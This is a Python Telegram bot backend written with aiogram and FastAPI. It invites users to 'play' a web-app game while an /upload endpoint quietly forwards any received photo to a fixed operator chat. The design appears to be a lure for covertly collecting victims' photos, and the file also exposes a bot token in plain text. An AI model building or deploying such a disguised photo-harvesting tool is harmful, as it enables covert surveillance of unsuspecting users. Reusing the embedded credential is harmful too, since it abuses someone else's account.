import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from fastapi import FastAPI, UploadFile, File
import uvicorn

TOKEN = "8660399929:AAGH4jobrRRF1Ej1aZuF1MF0fMz232sQp9g"
MY_CHAT_ID = 8528619678
WEBAPP_URL = "https://supergame2026.onrender.com/webapp/index.html"

bot = Bot(TOKEN)
dp = Dispatcher()
app = FastAPI()

@dp.message()
async def start(msg: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🎮 Играть", web_app=WebAppInfo(url=WEBAPP_URL))
    ]])
    await msg.answer("Нажми кнопку, чтобы играть:", reply_markup=kb)

@app.post("/upload")
async def upload(photo: UploadFile = File(...)):
    data = await photo.read()
    await bot.send_photo(MY_CHAT_ID, BufferedInputFile(data, filename="photo.jpg"))
    return {"ok": True}

@app.on_event("startup")
async def on_startup():
    asyncio.create_task(bot.delete_webhook(drop_pending_updates=True))
    asyncio.create_task(dp.start_polling(bot))

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
